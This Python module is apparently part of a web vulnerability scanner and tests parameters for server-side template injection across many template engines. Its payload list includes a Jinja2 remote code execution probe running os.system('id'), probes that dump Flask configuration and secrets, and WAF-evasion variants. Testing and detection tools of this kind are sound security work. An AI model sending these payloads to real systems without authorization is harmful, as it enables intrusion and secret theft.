"""
modules/ssti.py
───────────────
Server-Side Template Injection (SSTI) test module — extracted from V28.

FOR AUTHORIZED SECURITY TESTING AND CTF COMPETITIONS ONLY.

Detection strategy
──────────────────
Injects math-expression probes for 12+ template engines (Jinja2, Twig,
Smarty, Velocity, FreeMarker, Pebble, EJS, Thymeleaf, OGNL, Groovy,
Razor, Mako).  Uses a baseline response to eliminate SPA false-positives
where the numeric result was already present in the page before injection.

On a confirmed hit, attempts an optional engine-fingerprint step by sending
a secondary probe unique to the most likely engine.

Public API
──────────
    async def run(scanner) -> None

Requires scanner attributes
────────────────────────────
    scanner.config          dict  — verbose, skip_ssti
    scanner.param_map       dict[url, list[param]]
    scanner.waf_detected    bool
    scanner.waf_evasion     AdvancedWAFEvasion instance
    scanner._make_request   coroutine(method, url, *, params) → Response|None
    scanner._get_baseline   coroutine(url, method, param) → Response|None
    scanner.log_vuln        callable(Vulnerability) → None
    scanner._calculate_severity  callable(str) → (severity, cvss_float)
"""

from __future__ import annotations

import logging
from typing import Dict, List, Optional, Tuple

from core.models import Vulnerability, calculate_severity

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Payload data  (probe, expected_in_response, engine_hint)
# ─────────────────────────────────────────────────────────────────────────────

#: Each tuple is (payload, expected_output, engine_label).
#: engine_label is used purely for the finding description.
SSTI_PROBES: List[Tuple[str, str, str]] = [
    # Generic / multi-engine math probes
    ("{{7*7}}",                 "49",                "Jinja2/Twig"),
    ("${7*7}",                  "49",                "Thymeleaf/EL"),
    ("<%= 7*7 %>",              "49",                "ERB/EJS"),
    ("#{7*7}",                  "49",                "Ruby/Pebble"),
    ("{{7*'7'}}",               "7777777",           "Jinja2"),
    ("*{7*7}",                  "49",                "Spring SpEL"),
    # Double-probe (Jinja2)
    ("{{7*7}}{{7*7}}",          "4949",              "Jinja2"),
    # Jinja2 object leaks (Flask)
    ("{{config}}",              "Config",            "Flask/Jinja2"),
    ("{{self}}",                "<TemplateReference","Jinja2"),
    ("{{request}}",             "Request",           "Flask"),
    # Jinja2 RCE probe (os.system returns 0 on success)
    ("{%import os%}{{os.system('id')}}",  "0",       "Jinja2 RCE"),
    # Smarty
    ("{php}echo 7*7;{/php}",    "49",                "Smarty"),
    ("{7*7}",                   "49",                "Smarty"),
    # Razor (.NET)
    ("@(7*7)",                  "49",                "Razor"),
    # Velocity
    ("#set($x=7*7)$x",          "49",                "Velocity"),
    # FreeMarker
    ("<#assign x=7*7>${x}",     "49",                "FreeMarker"),
    # Pebble
    ("{{=7*7}}",                "49",                "Pebble"),
    # EJS
    ("[%= 7*7 %]",              "49",                "EJS"),
    # OGNL (Apache Struts)
    ("%{7*7}",                  "49",                "OGNL/Struts"),
    # Groovy GString
    ("${{7*7}}",                "49",                "Groovy"),
]

#: Engine-specific confirmation probes run *after* initial detection
#: to fingerprint more precisely.  Dict: engine_hint → (probe, expected).
ENGINE_CONFIRM_PROBES: Dict[str, Tuple[str, str]] = {
    "Jinja2/Twig":  ("{{7*'7'}}", "7777777"),
    "Jinja2 RCE":   ("{{''.__class__.__mro__}}", "object"),
    "Flask/Jinja2": ("{{config.items()}}", "SECRET"),
    "Velocity":     ("#set($x='x'*7)$x", "xxxxxxx"),
    "FreeMarker":   ("<#list 1..3 as i>${i} </#list>", "1 2 3"),
    "Groovy":       ('${"hello".toUpperCase()}', "HELLO"),
}

REMEDIATION = (
    "1. Never pass unsanitised user input to a template engine. "
    "2. Use a logic-less template engine (e.g. Mustache) or sandbox the engine. "
    "3. Apply strict input allowlisting before rendering. "
    "4. If RCE is confirmed, treat as Critical — rotate all secrets immediately. "
    "See: https://portswigger.net/web-security/server-side-template-injection"
)


# ─────────────────────────────────────────────────────────────────────────────
# Internal helpers
# ─────────────────────────────────────────────────────────────────────────────

def _make_vuln(
    url: str, param: str, payload: str, evidence: str,
    method: str, engine: str, severity: str, cvss: float,
) -> Vulnerability:
    return Vulnerability(
        type=f"SSTI ({engine})",
        url=url,
        parameter=param,
        payload=payload,
        evidence=evidence,
        confidence="High",
        severity=severity,
        cvss_score=cvss,
        method=method,
        detection_method="Template math-expression probe with baseline comparison",
        remediation=REMEDIATION,
        references=["CWE-94", "OWASP-A03:2021"],
    )


async def _try_confirm_engine(
    scanner,
    url: str, param: str, method: str, engine_hint: str,
) -> Optional[str]:
    """
    Run a secondary probe to narrow down the exact engine.
    Returns a more specific engine label, or the original hint on failure.
    """
    probe_data = ENGINE_CONFIRM_PROBES.get(engine_hint)
    if not probe_data:
        return engine_hint

    probe, expected = probe_data
    res = await scanner.make_request(method, url, params={param: probe})
    if res and expected in res.text:
        return f"{engine_hint} (confirmed)"
    return engine_hint


# ─────────────────────────────────────────────────────────────────────────────
# Core test function
# ─────────────────────────────────────────────────────────────────────────────

async def _test_ssti(scanner, url: str, param: str, method: str) -> bool:
    """
    Test a single (url, param, method) combination for SSTI.

    1. Fetch baseline to avoid SPA false-positives.
    2. For each probe, apply WAF bypass variants if needed.
    3. Confirm the expected output is in the response but NOT the baseline.
    4. Optionally fingerprint the engine with a secondary probe.
    5. Log a Vulnerability and return True on first confirmed hit.
    """
    baseline = await scanner.make_request(method, url, params={param: "safe_probe_value"})
    baseline_text = baseline.text if baseline else ""

    for payload, expected, engine_hint in SSTI_PROBES:
        # Skip probes whose expected output is already on the page
        if expected in baseline_text:
            continue

        variants: List[str]
        if getattr(scanner, "waf_detected", False):
            variants = scanner.waf_evasion.generate_variants(payload, 2)
        else:
            variants = [payload]

        for variant in variants:
            res = await scanner.make_request(method, url, params={param: variant})
            if res is None:
                continue

            if expected in res.text and expected not in baseline_text:
                # Confirmed — try to fingerprint engine
                engine = await _try_confirm_engine(
                    scanner, url, param, method, engine_hint
                )
                severity, cvss = calculate_severity("SSTI")

                scanner.log_vuln(
                    _make_vuln(
                        url, param, variant,
                        f"Expected output '{expected}' found in response "
                        f"(absent from baseline) | Engine: {engine}",
                        method, engine, severity, cvss,
                    )
                )
                return True

    return False


# ─────────────────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────────────────

async def run(scanner, url: str, param: str, method: str = "GET") -> None:
    """Entry point called per-param by scan_url()."""
    if scanner.config.get("skip_ssti"):
        return

    found = await _test_ssti(scanner, url, param, method)

    if scanner.config.get("verbose") and not found:
        logger.debug("SSTI: no finding at %s [%s]", url, param)
